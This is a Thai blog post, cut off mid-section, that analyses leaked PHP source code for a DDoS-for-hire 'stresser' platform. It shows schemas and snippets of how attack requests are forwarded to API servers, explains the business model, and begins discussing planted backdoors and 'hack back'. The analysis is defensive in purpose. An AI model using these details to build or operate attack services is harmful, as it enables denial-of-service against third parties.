---
title: "Code Note 0x3: DDoS as a Service"
date: 2020-11-07T18:35:47+07:00
author: "P. Boonyakarn"
description: "Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในฉบับที่ 0x3 จะเป็นการนำโค้ดของบริการ DDoS as a Service ที่ถูกปล่อย (รั่วไหล) ออกมาวิเคราะห์และตรวจสอบ เพื่อความเข้าใจที่มากขึ้นเกี่ยวกับการดำเนินการของบริการ DDoS as a Service หรือ DDoS for Hire"
---

> **Code Note** คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอตามจุดประสงค์ของแต่ละโครงการ

หากอ้างอิงจากโควตด้านบนซึ่งอธิบายคอนเซ็ปต์ของ Code Note เนื้อหาของบล็อกในครั้งนี้อาจไม่ได้ตรงกับคอนเซ็ปต์เท่าไหร่นักเนื่องจากเนื้อหาโค้ดของเราในวันนี้ไม่ได้มาจากโครงการโอนเพนซอร์ส แต่เป็นโค้ดของแพลตฟอร์ม DDoS as a Service (DDoSaas) ซึ่งหลุดออกมาและมีเผยแพร่อยู่ในอินเตอร์เน็ต ซอร์สโค้ดชุดดังกล่าวสามารถนำไปใช้ทำแพลตฟอร์ม DDoS as a Service ได้ทันทีหากผู้ใช้งานมีเซิร์ฟเวอร์สำหรับใช้โจมตี DDoS อยู่แล้ว

{{< image src="https://i.imgur.com/Ehsa8aR.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

บทเรียนอย่างหนึ่งที่ผมได้จาก [Code Note 0x2: ATPMiniDump](https://pandora.sh/posts/code-note-0x2-atpminidump/) และมีอิทธิพลต่อการเขียน **Code Note 0x3: DDoS as a Service Platform** อย่างมากนั้นคือเราอาจไม่มีความจำเป็นที่จะต้องอ่านโค้ดทุกบรรทัดเพื่อทำความเข้าใจ ดังนั้น Code Note 0x3 นี้จะเน้นไปที่การพูดถึงฟังก์ชันของชุดซอร์สโค้ด ผสมกับมุมมองและแนวคิดของบริการ DDoS as a Service ซึ่งอาจทำให้เราเข้าใจพฤติกรรมของการโจมตีในลักษณะนี้มากขึ้นครับ

หัวข้อซึ่งเราจะพูดถึงในบล็อกมีดังนี้ครับ

- [Overview](#overview)
- [Background](#background)
- [Commanding the Attack](#commanding-the-attack)
- [Hacking the Platform](#hacking-the-platform)
  - [A Hidden Telemetry](#a-hidden-telemetry)
  - [Authenticated SQL Injection](#authenticated-sql-injection)
  - [Remote Code Execution via Backdoor Code](#remote-code-execution-via-backdoor-code)
- [Final Note](#final-note)

เนื่องจากชุดซอร์สโค้ดดังกล่าวสามารถนำไปใช้เป็นระบบ frontend ของบริการ DDoS as a Service ได้ทันที ผมขอสงวนการพูดถึงแหล่งที่มาและรายละเอียดอื่น ๆ ที่อาจบ่งชี้หรือเป็นการเผยแพร่ชุดซอร์สโค้ดดังกล่าวไม่ว่าจะเป็นทางตรงหรือทางอ้อมเพื่อป้องกันการนำไปใช้อย่างไม่ถูกต้องครับ

# Overview

ชุดซอร์สโค้ดของแพลตฟอร์ม DDoSaaS ที่เราได้มาดูกันนี้ทำให้บล็อกชุด Code Note ได้มีโอกาสพูดถึงภาษาใหม่ขึ้นมาอีกหนึ่งภาษาคือ PHP หลังจากที่เราได้พูดถึง[โค้ดในภาษา Python ไว้ใน Code Note 0x1](https://pandora.sh/posts/code-note-0x1-deathransom/) และ[ภาษา C ไว้ใน Code Note 0x2](https://pandora.sh/posts/code-note-0x2-atpminidump/) ชุดซอร์สโค้ดนี้ถูกพัฒนาโดยใช้ภาษา PHP ดั้งเดิม ไม่มีการใช้ framework ใดเสริมในส่วนของ backend การแจกจ่ายชุดซอร์สโค้ดนี้ยังมาพร้อมกับไฟล์ฐานข้อมูลที่จำเป็นต่อการใช้งานด้วย

เนื่องจากโครงสร้างไฟล์ของชุดซอร์สโค้ดนี้มีขนาดที่ใหญ่ ผมจะขอแสดงโครงสร้างไฟล์เฉพาะที่เลเวลที่ให้ข้อมูลที่พอจำเป็น เพื่อให้เห็นตำแหน่งของไฟล์ไว้ใช้อ้างอิงในส่วนเนื้อหาต่อไปครับ

```
.
|-- DB
|   `-- stresser.sql
|-- acc.php
|-- admin
|   |-- alogs.php
|   |-- api.php
|   |-- apil7.php
|   |-- aplogs.php
|   |-- customers.php
|   |-- dnsapi.php
|   |-- dwhitelist.php
|   |-- edit-user.php
|   |-- editapi.php
|   |-- editapil7.php
|   |-- editdns.php
|   |-- editdw.php
|   |-- editemail.php
|   |-- editen.php
|   |-- editew.php
|   |-- editgeo.php
|   |-- editip2s.php
|   |-- editip2sw.php
|   |-- editmeth.php
|   |-- editphone.php
|   |-- editplan.php
|   |-- editpw.php
|   |-- editskype.php
|   |-- editskypes.php
|   |-- editsw.php
|   |-- edittoe.php
|   |-- editvpn.php
|   |-- emailapi.php
|   |-- emailw.php
|   |-- error_log
|   |-- foot.php
|   |-- general.php
|   |-- geoapi.php
|   |-- gifts.php
|   |-- header.php
|   |-- index.php
|   |-- ip2sapi.php
|   |-- ip2whitelist.php
|   |-- llogs.php
|   |-- methods.php
|   |-- news.php
|   |-- panel.php
|   |-- phoneapi.php
|   |-- phonew.php
|   |-- plans.php
|   |-- plogs.php
|   |-- skypeapi.php
|   |-- skypedbapi.php
|   |-- skypeetoeapi.php
|   |-- skypew.php
|   |-- support.php
|   |-- ticket.php
|   |-- useractivity.php
|   `-- vwhitelist.php
|-- boottest.php
|-- dashboard.php
|-- error_log
|-- gift.php
|-- h.php
|-- includes
|   |-- db.php
|   |-- functions.php
|   |-- index.php
|   |-- init.php
|   |-- kekmth
|   |   `-- user
|   |       `-- giftcodes
|   |           |-- error_log
|   |           `-- redeem.php
|   `-- waf.php
|-- index.php
|-- login.jpg
|-- login.php
|-- login.png
|-- logo.svg
|-- logout.php
|-- news.php
|-- php.ini
|-- purchase.php
|-- register.php
|-- rocket1.png
|-- s.php
|-- staff
|   |-- alogs.php
|   |-- customers.php
|   |-- edit-user.php
|   |-- header.php
|   |-- index.php
|   |-- llogs.php
|   |-- plogs.php
|   |-- support.php
|   |-- ticket.php
|   `-- useractivity.php
|-- stress.php
|-- t.php
`-- test.php
```

จากโครงสร้างของซอร์สโค้ด เราจะสังเกตได้ว่าซอร์สโค้ดมีการแบ่งฟังก์ชันตาม role ที่จะมีในระบบ ได้แก่ ผู้ใช้งานทั่วไปที่ผ่านการสมัครสมาชิกแล้ว (member), ผู้ใช้งานกลุ่มที่เป็นเจ้าหน้าที่ของระบบ (staff) และผู้ใช้งานที่เป็นกลุ่มผู้ดูแลระบบ (admin)

{{< image src="https://i.imgur.com/6LmeRmz.png" alt="" position="center" style="border-radius: 8px;" >}}

รายละเอียดของไฟล์โดยคร่าวมีตามรายการดังนี้

- ภายใต้ไดเรกทอรี `admin` เป็นกลุ่มของไฟล์สำหรับการตั้งค่าระบบ ผู้โจมตีสามารถติดตามพฤติกรรมการใช้งานของผู้ใช้งานทั่วไปในระบบได้ว่ามีการใช้ DDoSaaS เพื่อโจมตีระบบใด, จัดการระบบสมาชิกและแก้ไขการตั้งค่าต่างๆ ของบัญชีผู้ใช้งาน, จัดการการเชื่อมต่อไปยังเซิร์ฟเวอร์ API ซึ่งส่วนของเซิร์ฟเวอร์ที่จะควบคุมการโจมตีจริง , ดูรายได้ที่ได้จากบริการ, ปรับแต่งแผนการขายและอื่นๆ
- ภายใต้ไดเรกทอรี `includes` เป็นกลุ่มของไฟล์ที่เกี่ยวข้องกับการทำงานหลักของระบบ เช่น การเชื่อมต่อกับฐานข้อมูล, ฟังก์ชันการ redeem, ฟังก์ชันดึงข้อมูลที่เกี่ยวข้องกับบัญชีผู้ใช้ต่างๆ รวมไปถึงฟังก์ชันของ web application firewall ซึ่งมีตัวเลือกสำหรับการตั้งค่าอยู่ใน directory นี้
- ภายใต้ไดเรกทอรี `staff` เป็นกลุ่มของไฟล์สำหรับกลุ่มเจ้าหน้าที่ของระบบ กลุ่มเจ้าหน้าที่ของระบบจะมีสิทธิ์ต่ำกว่าผู้ดูแลระบบ โดยมีหน้าที่ในการตรวจสอบความเรียบร้อยและตอบปัญหาของผู้ใช้งาน ไม่สามารถแก้ไขการตั้งค่าของผู้ใช้งานหรือเปลี่ยนข้อมูลของระบบได้
- ไฟล์ซึ่งอยู่นอกเหนือไดเรกทอรีใดๆ โดยทั้งหมดทำหน้าที่เกี่ยวพันกับการทำงานของระบบตาม storyboard การใช้งานระบบทั่วไป เช่น การแสดงข้อมูลแพลนการโจมตี, ระบบสมาชิก, ระบบตั้งค่าโจมตีและเริ่มโจมตีและระบบสำหรับติดต่อผู้ดูแลระบบเมื่อเกิดปัญหาในการใช้งาน

ชุดซอร์สโค้ดมีการใช้ไลบรารีสำหรับเชื่อมต่อกับระบบของ Paypal เพื่อจัดการการโอนเงินเพื่อซื้อบริการ อย่างไรก็ตามซอร์สโค้ดที่เราได้รับมาดูเหมือนจะขาดฟังก์ชันซึ่งทำให้ระบบสามารถรองรับการซื้อแพ็คเกจการโจมตีหรือปรับเปลี่ยนแพ็คเกจได้จริง 

หากนำซอร์สโค้ดในส่วนนี้ไปใช้จริง วิธีการหนึ่งซึ่งอาจเป็นไปได้โดยไม่จำเป็นต้องเขียนโค้ดใดๆ เพิ่มคือการรับการซื้อบริการผ่านทาง cryptocurrency โดยให้ผู้ที่ต้องการซื้อบริการส่งรายละเอียดการโอนเงินมา เมื่อผู้ดูแลตรวจสอบแล้วว่าการซื้อบริการนั้นเกิดขึ้นอย่างถูกต้อง ผู้ให้บริการก็ดำเนินการเพียงแค่เข้าไปแก้ไขอัตราการใช้งานของผู้ใช้บริการตามเงื่อนไขของการให้บริการต่อ

# Background

บริการ DDoS as a Service (DDoSaaS) หรือ DDoS for Hire เป็นที่รู้จักกันในหลายชื่อ แต่โดยส่วนใหญ่แล้วในโฆษณาซึ่งผู้ให้บริการใช้ประกาศเรียกหาลูกค้านั้นมักจะใช้คำว่า **Stresser** หรือ **Booster** มากกว่าการเรียกว่าเป็นบริการ DDoS as a Service โดยตรง

{{< image src="https://i.imgur.com/lsNcdVu.png" alt="" position="center" style="border-radius: 8px;" >}}

แนวทางการทำธุรกิจของบริการ DDoSaaS นั้นอยู่ที่การขายการเข้าถึงเครื่องมือและทรัพยากรให้แก่ผู้ที่ต้องการทำการโจมตี DDoS ผู้ใช้บริการสามารถเช่าบริการ DDoSaaS เพื่อโจมตีเป้าหมายที่ต้องการได้ตามระยะเวลาหรือตามเงื่อนไขการให้บริการที่กำหนด ในฝั่งของผู้ให้บริการก็จะมีการแบ่งลักษณะหรือรูปแบบของการขายออกเป็นแพ็คเกจหรือออกโปรโมชันเพื่อจูงใจให้มีการซื้อหรือเป็นเงื่อนไขในการทำกำไร โดยเงื่อนไขที่มักจะถูกใช้ในการทำแพ็คเกจบริการมีดังนี้

1. **จำนวนเป้าหมาย** บริการ DDoSaaS บางบริการจำกัดจำนวนเป้าหมายที่ผู้ใช้งานสามารถระบุต่อการโจมตีในหนึ่งครั้งเอาไว้ การจ่ายเงินมากขึ้นจะทำให้ผู้ใช้งานสามารถโจมตีเป้าหมายได้มากขึ้น
2. **ปริมาณการโจมตีต่อวัน** บริการ DDoSaaS อาจมีการจำกัดปริมาณการโจมตีต่อวันเอาไว้ด้วยหน่วยของเวลาหรือปริมาณการส่งออกข้อมูล โดยจะมีการเพิ่มปริมาณการโจมตีต่อวันหากผู้ใช้งานมีการซื้อบริการในราคาที่สูง
3. **ระยะเวลาในการโจมตี** บริการ DDoSaaS อาจมีการระบุกำลังในการโจมตีเป็นค่าที่ตายตัวเอาไว้ แต่อาจจำกัดระยะเวลาในการโจมตีแทน ในบางกรณีผู้ใช้งานสามารถแบ่งรอบการโจมตีได้ภายใต้เวลาของแพ็คเกจการโจมตีที่ซื้อมา เช่น แพ็คเกจแบบ Basic plan อาจให้เวลาในการโจมตีทั้งหมด 10 นาทีโดยการันตีปริมาณการโจมตีเอาไว้ ผู้ใช้งานสามารถแบ่งรอบภายใต้เงื่อนไข 10 นาทีออกเป็นการโจมตีหลายรอบได้ หรือใช้ 10 นาทีเป็นการโจมตีรอบเดียวก็ได้เช่นเดียวกัน
4. **กำลังในการโจมตี** หรือ Attack power มักเป็นปัจจัยหลักในการแบ่งราคา ผู้ให้บริการมักจะมีการการันตีกำลังในการโจมตีเอาไว้เป็นช่วงที่แตกต่างกันตามหน่วยต่าง ๆ อาทิ Request per second (Rqps), Gigabit per second (Gbps) หรือ packets per second (Pps) ซึ่งโดยส่วนใหญ่สำหรับแพ็คเกจแบบ Basic plan กำลังในการโจมตีมักถูกขายอยู่ในช่วง 80,000 - 120,000 Rqps หรือ 10 - 30 Gbps หรือ 1,000,000 Pps
5. **จำนวนการโจมตีในหนึ่งช่วงเวลา** หรือ Concurrent attack ในกรณีทั่วไปนั้น หากผู้ใช้งานซื้อบริการแบบ Basic plan ผู้ให้บริการอาจจะให้เซิร์ฟเวอร์หนึ่งกลุ่มซึ่งมีอยู่ประมาณไม่เกิน 5 ระบบในการโจมตี การเพิ่มจำนวนการโจมตีในหนึ่งช่วงเวลาจะทำให้ผู้ใช้บริการได้สิทธิ์ในการใช้เซิร์ฟเวอร์กลุ่มอีก (หรือเพิ่มขึ้นมาครั้งละ 5 ระบบ) ในการช่วยโจมตีได้
6. **โปรโตคอลที่ใช้ในการโจมตี** มักเป็นฟีเจอร์พื้นฐานที่ผู้ใช้งานสามารถเลือกใช้ได้ฟรีในทุกแพ็คเกจการโจมตี บริการ DDoSaaS มักแบ่งโปรโตคอลการที่ใช้ในการโจมตีให้ผู้ใช้งานได้เลือกใช้ตามลักษณะดังนี้
    1. โปรโตคอลในเลเยอร์ที่ 4 (L4) แยกตัวเลือกเป็น TCP และ UDP โดยอาจมีฟีเจอร์ของโปรโตคอลในแต่ละแบบซึ่งอาจส่งผลกระทบต่อการโจมตีให้เลือกด้วย
    2. โปรโตคอลในเลเยอร์ที่ 7 (L7) มักมีตัวเลือกเป็น HTTP หรือ DNS และอาจมีการใช้เทคนิคเข้ามาช่วย เช่น การทำ Amplification attack
7. **ฟีเจอร์เสริม** เช่น ฟีเจอร์ในการ Bypass โซลูชันป้องกันการโจมตี DDoS หรือฟีเจอร์ในการเลือกประเทศที่จะทำการโจมตีได้

การจ่ายเงินเพื่อซื้อบริการ DDoSaaS สามารถทำได้หลายรูปแบบทั้งผ่านบริการ Paypal หรือผ่าน Cryptocurrency ผู้ให้บริการมักมีช่องทางในการติดต่อเพื่อให้ผู้ใช้บริการยืนยันหรือแจ้งให้ผู้ให้บริการทราบเมื่อกระบวนการโอนเงินเสร็จแล้ว

{{< image src="https://i.imgur.com/EKSeeE6.png" alt="" position="center" style="border-radius: 8px;" >}}

เนื่องจากผู้ให้บริการ DDoSaaS นั้นเป็นผู้ให้เช่าบริการเพื่อโจมตี ความโปร่งใสในการใช้บริการหรือการรับรองว่าการโจมตีที่ซื้อบริการนั้นจะมีประสิทธิภาพจริงเป็นเรื่องที่เกิดขึ้นได้ยาก บริการ DDoSaaS โดยส่วนใหญ่พึ่งพาอาศัยเครือข่ายของระบบ Botnet หรือระบบ Zombies ซึ่งสามารถนำมาใช้โจมตีได้มาขายเป็นบริการ ความมั่นคงของตัวบริการเองหรือเสถียรภาพในการโจมตีเองจึงเป็นสิ่งที่ไม่สามารถรับประกันได้ว่าผู้ซื้อบริการจะได้รับสินค้าหรือบริการตามที่คาดหวังจริง

# Commanding the Attack

เมื่อผู้ใช้บริการทำการสมัครสมาชิกและซื้อแพ็คเกจการให้บริการจากบริการ DDoSaaS แล้ว ผู้ให้บริการจะทำการกำหนดปริมาณและเงื่อนไขการใช้งานไว้ในฐานข้อมูล ซึ่งจะทำให้ผู้ใช้งานสามารถเข้าถึงหน้าเพจ `stress.php` ซึ่งใช้ควบคุมการโจมตีได้

{{< image src="https://i.imgur.com/k2WDTsp.png" alt="" position="center" style="border-radius: 8px;" >}}

ตัวอย่างด้านล่างคือโครงสร้างของตาราง `payments`, `plans` และ `users` ในฐานข้อมูลซึ่งแสดงให้เห็นโครงสร้างซึ่งบันทึกการจ่ายเงินเพื่อซื้อบริการของผู้ใช้และแพ็คเกจการโจมตีที่ผู้ใช้งานสามารถใช้ได้ในตาราง `payments` ลักษณะของแพ็คเกจการให้บริการในตาราง `plans` และสถานะของผู้ใช้งานในตาราง `users`

```sql
-- ----------------------------
-- Table structure for payments
-- ----------------------------
DROP TABLE IF EXISTS `payments`;
CREATE TABLE `payments`  (
  `ID` int NOT NULL AUTO_INCREMENT,
  `paid` float NOT NULL,
  `plan` int NOT NULL,
  `user` int NOT NULL,
  `email` varchar(60) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `tid` varchar(30) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `date` int NOT NULL,
  PRIMARY KEY (`ID`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 1 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for plans
-- ----------------------------
DROP TABLE IF EXISTS `plans`;
CREATE TABLE `plans`  (
  `ID` int NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `description` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `mbt` int NOT NULL,
  `unit` varchar(10) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `length` int NOT NULL,
  `price` float NOT NULL,
  `con` varchar(10) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `private` int NOT NULL,
  `api` int NOT NULL,
  `network` varchar(11) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`ID`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 19 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users`  (
  `ID` int NOT NULL AUTO_INCREMENT,
  `username` varchar(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `password` varchar(40) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `email` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `uid` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `rank` int NOT NULL DEFAULT 0,
  `membership` int NOT NULL,
  `expire` bigint NOT NULL,
  `status` int NOT NULL,
  `tokens` int NOT NULL,
  `last_active` int NOT NULL,
  `apikey` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `apiip` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `joined` int NOT NULL,
  PRIMARY KEY (`ID`) USING BTREE,
  INDEX `ID`(`ID`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 3 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;
```

ไฟล์ `stress.php` ซึ่งผู้ใช้บริการสามารถตั้งค่าเงื่อนไขการโจมตีได้นั้นมีเงื่อนไขการตรวจสอบที่ซับซ้อนก่อนที่การโจมตีจริงจะเกิดขึ้น นอกเหนือจากการตรวจสอบว่าผู้ใช้งานมีการซื้อบริการและมีรายละเอียดบริการที่สามารถใช้ได้อย่างไรบ้างแล้ว เมื่อผู้ใช้งานระบุเป้าหมายในการโจมตี ได้แก่ ระบบเป้าหมาย, พอร์ตของระบบเป้าหมาย, ระยะเวลาที่จะทำการโจมตี, วิธีการในการโจมตีและ Captcha ที่ถูกต้องแล้ว ไฟล์ `stress.php` จะมีการตรวจสอบเงื่อนไขว่าระบบที่ผู้ใช้งานกรอกเข้ามาอยู่ใน whitelist ของระบบ DDoSaaS หรือไม่ด้วย

การตั้งค่าระบบ whitelist สามารถกำหนดได้ผ่าน `admin/editdw.php` หรือ `admin/dwhitelist.php` ได้

```php
$h = preg_replace("/(https?:\/\/)/is", "", $host);
$h = trim($h);
$h = rtrim($h, "/");
$SQLCheckBlacklist = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
$SQLCheckBlacklist->execute(array(':host' => $h));
$countBlacklist = $SQLCheckBlacklist->fetchColumn(0);
if ($countBlacklist > 0) {
	$notify = '<div class="col-md-12"><center><div class="alert alert-icon alert-danger alert-dismissible fade in" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><i class="mdi mdi-check-all"></i>IP is Whitelisted</div></center></div>';
```

หากเป้าหมายของผู้ใช้งานไม่อยู่ใน whitelist ของระบบ ไฟล์ `stress.php` จะทำการส่งข้อมูลของระบบเป้าหมายไปยังระบบซึ่งถูกเรียกว่า **API server** หรือระบบที่จะควบคุมและจัดการการโจมตีจริงผ่านฟังก์ชัน curl

```php
$SQLSelectAPI = $odb->query("SELECT * FROM `api` LIMIT 1");
try {
    foreach ($SQLSelectAPI as $row) {
        $arrayFind = array('[host]', '[port]', '[time]', '[method]');
        $arrayReplace = array($host, $port, $time, $method);
        $APILink = $row['api'];
        $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $APILink);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_exec($ch);
        curl_close($ch);
        sleep(3);
    }
} catch (Exception $e) {
    $dbh = null;
}
```

เราจะสามารถสังเกตหน้าที่ของการเป็น frontend ของชุดซอร์สโค้ดนี้ได้เนื่องจากชุดซอร์สโค้ดนี้ไม่ได้มีการโจมตีระบบเป้าหมายด้วยตัวเอง หรือมีการติดต่อไปยังระบบที่จะทำการโจมตีจริงๆ ด้วยตัวเอง แต่ชุดซอร์สโค้ดนี้กลับส่งข้อมูลเป้าหมายไปให้กับระบบ API server เพื่อจัดสรรการโจมตีอีกครั้ง

API server มีการแบ่งออกเป็น API server แบบปกติและ API server แบบ L7 โดยมีการเก็บข้อมูลแยกตารางกันในฐานข้อมูล ตามโครงสร้างตารางด้านล่าง

```sql
-- ----------------------------
-- Table structure for api
-- ----------------------------
DROP TABLE IF EXISTS `api`;
CREATE TABLE `api`  (
  `ID` int NOT NULL AUTO_INCREMENT,
  `handler` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `api` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `slots` int NOT NULL,
  `lastUsed` int NOT NULL,
  `active` int NOT NULL,
  PRIMARY KEY (`ID`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 19 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for apil7
-- ----------------------------
DROP TABLE IF EXISTS `apil7`;
CREATE TABLE `apil7`  (
  `ID` int NOT NULL AUTO_INCREMENT,
  `handler` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `api` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `slots` int NOT NULL,
  `lastUsed` int NOT NULL,
  `active` int NOT NULL,
  PRIMARY KEY (`ID`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 16 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;
```

เนื่องจากผู้ดูแลระบบเป็นกลุ่มผู้ใช้งานเดียวที่สามารถกำหนดรายละเอียดของ API server จริงได้ หากเราเข้าไปดูที่ไฟล์ในกลุ่ม `admin/api.php` , `admin/apil7.php`  และ `admin/methods.php` เราจะเข้าใจการทำงานของสิ่งที่เรียกว่า API server มากยิ่งขึ้น

```php
<?php
if (isset($_POST['addBtn'])) {
    $handler1 = htmlspecialchars($_POST['handler']);
    $api2 = html_entity_decode($_POST['api'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
    $slots = htmlspecialchars($_POST['slots']);

    if (empty($handler1) || empty($api2) || empty($slots)) {
        echo '<div class="alert alert-icon alert-danger alert-dismissible fade in" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><i class="mdi mdi-check-all"></i>Fill in all fields</div>';
    } else {
        $SQLinsert = $odb->prepare("INSERT INTO `api` VALUES(NULL, :handler, :api, :slots, UNIX_TIMESTAMP(NOW()), :active)");
        $SQLinsert->execute(array(':handler' => $handler1, ':api' => $api2, ':slots' => $slots, ':active' => 1));
        echo '<div class="alert alert-icon alert-success alert-dismissible fade in" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><i class="mdi mdi-check-all"></i>API has been added!</div>';
    }
}
?>
```

```php
<p class="text-muted font-13 m-b-30">Add the methods you want your Stresser to have.. (Must be applicable with API)</p>
<div class="col-md-7">
<form role="form" method="POST">
<?php
if (isset($_POST['addMethod'])) {
    $name = htmlspecialchars($_POST['name']);
    $friendly = htmlspecialchars($_POST['friendly']);
    $type = htmlspecialchars($_POST['type']);

    if (empty($name) || empty($friendly)) {
        $errors[] = 'Please fill in all fields.';
    }
    if (empty($errors)) {
        $insertMethod = $odb->prepare("INSERT INTO `methods` VALUES (NULL, :friendly, :name, UNIX_TIMESTAMP(), :type)");
        $insertMethod->execute(array(':name' => $name, ':friendly' => $friendly, ':type' => $type));
        echo '<div class="alert alert-icon alert-success alert-dismissible fade in" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><i class="mdi mdi-check-all"></i>You have added a new method successfully!</div>';
    } else {
        echo '<div class="alert alert-danger"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong><i class="mdi mdi-check-all"></i>Error has Occurred!</strong><br />';
        foreach ($errors as $error) {
            echo '' . $error . '<br />';
        }
        echo '</div>';
    }
}
?>
```

ในมุมของฝั่งป้องกัน การเข้าถึงฐานข้อมูลของบริการ DDoSaaS ได้จะทำให้การควบคุมและจัดการสามารถดำเนินการได้อย่างมีประสิทธิภาพมากขึ้น เนื่องจากฝั่งป้องกันสามารถทราบ API server endpoint ที่เป็นไปได้ทั้งหมด ซึ่งสามารถนำไปสู่การแกะรอยไปหาระบบที่จะทำการโจมตีจริงต่อ

# Hacking the Platform

ความเสี่ยงของการใช้ซอร์สโค้ดซึ่งถูกพัฒนาหรือเผยแพร่โดยแฮกเกอร์มักเป็นที่รู้กันอยู่แล้วในวงการ แฮกเกอร์ที่มีประสบการณ์มักตั้งใจสร้างความเสี่ยงหรือช่องโหว่เพื่อหลอกกลุ่มผู้ที่มีประสบการณ์ต่ำหรือกลุ่มที่มักจะเอาเครื่องมือไปใช้เพื่อโจมตีและเรียกตัวเองว่าเป็นแฮกเกอร์ ซึ่งเรามักจะรู้จักกันจากคำว่า Script kiddie ความเสี่ยงและช่องโหว่ที่ถูกตั้งใจสร้างไว้เหล่านี้จะทำให้ผู้พัฒนาหรือผู้ที่รู้การมีอยู่ของช่องโหว่สามารถหาความได้เปรียบหรือผลประโยชน์จากกลุ่มคนที่เอาเครื่องมือไปใช้โดยไม่อ่านซอร์สโค้ดเสมอ

อย่างไรก็ตามในอีกมุมมองหนึ่ง การตั้งใจทำให้ระบบมีความเสี่ยงหรือช่องโหว่ก็สามารถถูกนำมาใช้ได้ตามแนวคิดของการ **Hack back**

แนวคิดของการ [Hack back](https://www.american.edu/sis/centers/security-technology/hack-back-toward-a-legal-framework-for-cyber-self-defense.cfm) เมื่อถูกโจมตีเป็นแนวคิดที่ยังไม่ได้รับการยอมรับเท่าไหร่นักในวงการซึ่งผูกคุณลักษณะของการมีจริยธรรม (ethical) เอาไว้หน้าคำเรียก อย่างไรก็ตามหากมองในมุมของ Cyber warfare หรือ Cyber intelligence แล้วนั้น การ Hack back เป็นเพียงแค่หนึ่งในตัวเลือกของวิธีการในการ Counter attack หรือ Counter intelligence เพื่อขัดขวางหรือหยุดปฏิบัติการอันเป็นปฏิปักษ์ และมันเป็นตัวเลือกที่มีอาจฟังดูสมเหตุสมผลหากผลประโยชน์ที่เกิดขึ้นจากการทำสำเร็จนั้นมีมากกว่าผลเสีย

เนื้อหาในส่วนต่อไปจะเป็นการพูดถึงความเสี่ยงและช่องโหว่ที่มีอยู่ในชุดซอร์สโค้ดนี้ ซึ่งสามารถนำไปใช้ในการโจมตีระบบ DDoSaaS ที่ใช้ชุดซอร์สโค้ดเดียวกันนี้ในการให้บริการได้ครับ เราขอข้ามการพูดถึงจุดมุ่งหมายในใช้ช่องโหว่เหล่านี้ไป และขอให้การเลือกดังกล่าวมาพร้อมกับความรับผิดชอบในการกระทำของผู้กระทำเองครับ

## A Hidden Telemetry

ในไฟล์ `includes/init.php` ซึ่งถูกเรียกใช้โดยหลายไฟล์ในชุดซอร์สโค้ดเพื่อแสดงข้อมูลทั่วไปของระบบมีการปรากฎของโค้ดในภาษา PHP ที่มีการเรียกใช้ฟังก์ชัน `base64_decode()` และฟังก์ชัน `eval()` กับก้อนข้อมูลที่ผ่านฟังก์ชัน `base64_encode()` มาตามตัวอย่างด้านล่าง

```php
